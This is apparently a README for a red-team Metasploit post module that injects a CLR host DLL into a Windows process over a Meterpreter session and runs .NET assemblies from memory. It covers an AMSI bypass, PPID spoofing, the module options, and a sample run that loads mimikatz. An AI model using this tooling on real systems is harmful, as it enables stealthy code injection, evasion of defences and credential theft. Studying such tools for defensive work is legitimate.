# Execute assembly via Meterpreter session

This is a custom Metasploit post module to executing a .NET Assembly from Meterpreter session

This project target

Windows 10 64bit<br />
.Net 4.0<br />
Metasploit Framework 5<br />

It spawn a process (or use an existing process providing pid) and use Reflective dll injection to load HostingCLRx64.dll needed to run .Net assembly
The unmanaged injected dll takes care of verifying if the process has already loaded the clr, and loads it if necessary. The version of the CLR to be loaded is determined by executing the parsing of the assembly provided searching for a known signature. Then run the assembly from memory.
Before loading the assembly in the context of the clr, Amsi is bypassed using the [AmsiScanBuffer patching technique](https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/)

You'll find details at [Execute assembly via Meterpreter session](https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/) and [Execute assembly via Meterpreter session - Part 2](https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session-part-2/)

## Install

Create $HOME/.msf4/modules/post/windows/manage<br />
Copy execute-assembly.rb in $HOME/.msf4/modules/post/windows/manage/<br />
Create $HOME-METASPLOIT-DATADIR/execute-assembly<br />
Copy HostingCLRx64.dll in $HOME-METASPLOIT-DATADIR/post/execute-assembly/<br /> 

## Module options and execution

```
Module options (post/windows/manage/execute_assembly):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   AMSIBYPASS    true             yes       Enable Amsi bypass
   ARGUMENTS                      no        Command line arguments
   ASSEMBLY                       yes       Assembly file name
   ASSEMBLYPATH                   no        Assembly directory
   PID           0                no        Pid  to inject
   PPID          0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)
   PROCESS       notepad.exe      no        Process to spawn
   SESSION                        yes       The session to run this module on.
   WAIT          10               no        Time in seconds to wait

Module advanced options (post/windows/manage/execute_assembly):                            

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   KILL       false            yes       Kill the injected process at the end of the task
   VERBOSE    false            no        Enable detailed status messages
   WORKSPACE                   no        Specify the workspace for this module

```

AMSIBYPASS

Enable or Disable Amsi bypass. This parameter is necessary due to the technique used. It is possible that subsequent updates will make the bypass unstable which could result in a crash. By setting the parameter to false the module continues to work.

ARGUMENTS

Command line arguments. The signature of the Main method must match with the parameters that have been set in the module, for example:

If the property ARGUMENTS is set to "antani sblinda destra" the main method should be "static void main (string [] args)"<br />
If the property ARGUMENTS is set to "" the main method should be "static void main ()"

ASSEMBLY 

Assembly file name. This will be searched in ASSEMBLYPATH

ASSEMBLYPATH

Assembly directory where to serach ASSEMBLY

PID

Pid to inject. If different from 0 the module does not create a new process but uses the existing process identified by the PID parameter.

PPID

Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)

PROCESS

Process to spawn when PID is equal to 0.

SESSION

The session to run this module on. Must be meterpreter session

WAIT

Time in seconds to wait before starting to read the output.

KILL

Kill the injected process at the end of the task

```
msf post(windows/manage/execute-assembly) > exploit 

[*] Launching notepad to host CLR...
[+] Process 4708 launched.
[*] Reflectively injecting the Host DLL into 4708...
[*] Injecting Host into 4708...
[*] Host injected. Copy assembly into 4708...
[*] Assembly copied. Executing...
[*] Start reading output
[+] 
[+]   .#####.   mimikatz 2.1.1 (x64) built on Oct 22 2018 16:32:27
[+]  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
[+]  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
[+]  ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
[+]  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
[+]   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
[+] 
[+] mimikatz(powershell) # coffee
[+] 
[+]     ( (
[+]      ) )
[+]   .______.
[+]   |      |]
[+]   \      /
[+]    `----'
[+] 
[*] End output.
[+] Killing process 4708
[+] Execution finished.
[*] Post module execution completed
msf post(windows/manage/execute-assembly) >
```
